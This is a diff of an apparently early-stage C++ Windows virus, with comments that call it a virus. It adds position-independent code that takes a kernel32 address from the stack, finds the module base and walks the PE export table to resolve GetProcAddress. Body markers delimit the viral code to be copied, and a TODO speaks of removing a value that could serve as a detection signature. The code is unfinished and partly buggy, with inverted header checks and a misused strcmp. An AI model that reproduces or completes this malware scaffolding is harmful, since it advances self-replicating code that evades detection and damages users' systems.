@@ -3,6 +3,20 @@
 #include <windows.h> //TODO Header can generate entities. Check it
 
 TYPE_SIZE getEIP();
+void start();
+
+//====================================================================================================
+int main() {
+	//some debug stuff can be placed here
+	auto pKernel32 = GetModuleHandle("kernel32.dll");
+
+	__asm {//using inline asm  just to debug code
+		push pKernel32
+	}
+	
+	//Call main virus function
+	start();
+}
 
 //====================================================================================================
 TYPE_SIZE MARKER_BODYBEGIN() {
@@ -10,6 +24,9 @@ TYPE_SIZE MARKER_BODYBEGIN() {
 	const TYPE_SIZE offsetTillFuncBegin = 0x9;
 	return curEIP - offsetTillFuncBegin;
 }
+
+//Include point
+#include "dynamic_utils.hpp"
 
 //====================================================================================================
 TYPE_SIZE getEIP() {
@@ -27,7 +44,7 @@ TYPE_SIZE MARKER_MARKEREXAMPLE() {
 
 //====================================================================================================
 bool checkIsPE(TYPE_SIZE addr) {
-	if (((char*)addr)[0] != 'Z' && ((char*)addr)[1] != 'M') return false;
+	if (((char*)addr)[0] != 'M' && ((char*)addr)[1] != 'Z') return false; //TODO decltype('c')* ~ char*
 	addr +=((_IMAGE_DOS_HEADER*)addr)->e_lfanew;
 	if (((char*)addr)[0] != 'P' && ((char*)addr)[1] != 'E') return false;
 	return true;
@@ -40,40 +57,47 @@ TYPE_SIZE getPEImageBase(TYPE_SIZE addressSomewhereInModule) {
 	return addressSomewhereInModule;
 }
 
-int main() {
-	int i;
-	++i;
-	/*
-	TYPE_SIZE stackCanary;
-	TYPE_SIZE* stackIter = &stackCanary;
+//====================================================================================================
+void start() {
+	//Stack here:
+	//...		dataObject
+	//+0x8/0x10	stackIter
+	//+0x4/0x8	Function stack frame ptr (ebp/rbp)
+	//0x0		kernel32_addr
 
+	TYPE_SIZE stackIter[1] = {0xDEADBEEF}; //TODO remove value cos it can be a signature
 	CVirusData dataObject;
 
+	//Get addr somewhere in kernel32 from stack
+	auto addrSomewhereInKernel32 = stackIter[4]; //TODO what the fuck is going here - addrSomewhereInKernel32 sometimes invalid
+	//Get kernel32 base addr
+	TYPE_SIZE kernel32Addr = getPEImageBase(addrSomewhereInKernel32);
 
-	TYPE_SIZE pVirusBodyBegin = MARKER_BODYBEGIN();
-	TYPE_SIZE pVirusBodyEnd = MARKER_BODYEND();
+	//Acquire kernel32 funcs addresses
+	//Aquire GetProcAddress addr
+	auto MainPESignatureOffset = ((IMAGE_DOS_HEADER*)kernel32Addr)->e_lfanew;
+	auto MainPESignatureOffsetAddr = kernel32Addr + MainPESignatureOffset;
 
-	//Initializing functions names
-	//GetProcAddress
-	dataObject.funcname_GetProcAddress[0] = 'G';
-	dataObject.funcname_GetProcAddress[1] = 'e';
-	dataObject.funcname_GetProcAddress[2] = 't';
-	dataObject.funcname_GetProcAddress[3] = 'P';
-	dataObject.funcname_GetProcAddress[4] = 'r';
-	dataObject.funcname_GetProcAddress[5] = 'o';
-	dataObject.funcname_GetProcAddress[6] = 'c';
-	dataObject.funcname_GetProcAddress[7] = 'A';
-	dataObject.funcname_GetProcAddress[8] = 'd';
-	dataObject.funcname_GetProcAddress[9] = 'd';
-	dataObject.funcname_GetProcAddress[10] = 'r';
-	dataObject.funcname_GetProcAddress[11] = 'e';
-	dataObject.funcname_GetProcAddress[12] = 's';
-	dataObject.funcname_GetProcAddress[13] = 's';
-	dataObject.funcname_GetProcAddress[14] = '\0';
-	*/
+	auto OptionalPEHeaderAddr = MainPESignatureOffsetAddr + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_NT_HEADERS::Signature);
 
+	
+	auto imageDataDirExportAddr = ((IMAGE_OPTIONAL_HEADER*)OptionalPEHeaderAddr)->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+kernel32Addr;
+	auto pExportFuncsNames = ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNames + kernel32Addr;
+
+	TYPE_SIZE i = 0;
+	do{
+		auto curFuncNameAddr = kernel32Addr + ((TYPE_SIZE*)pExportFuncsNames)[i];
+		if (strcmp((TYPE_BYTE*)curFuncNameAddr, (TYPE_BYTE*)dataObject.funcname_GetProcAddress) == true) { break; }
+	} while (++i);
+	auto getProcAddrOrdinal = ((TYPE_WORD*)(((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNameOrdinals + kernel32Addr))[i];
+	dataObject.addr_GetProcAddress = (void*)((unsigned)   ((TYPE_SIZE*)( ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfFunctions + kernel32Addr) )[getProcAddrOrdinal]+kernel32Addr);
+	
+	//Acquire other funcs addresses with GetProcAddr
+
+	kernel32Addr++;
 }
 
+//====================================================================================================
 TYPE_SIZE MARKER_BODYEND() {
 	TYPE_SIZE curEIP = getEIP();
 	const TYPE_SIZE offsetTillFuncEnd = 0x14;
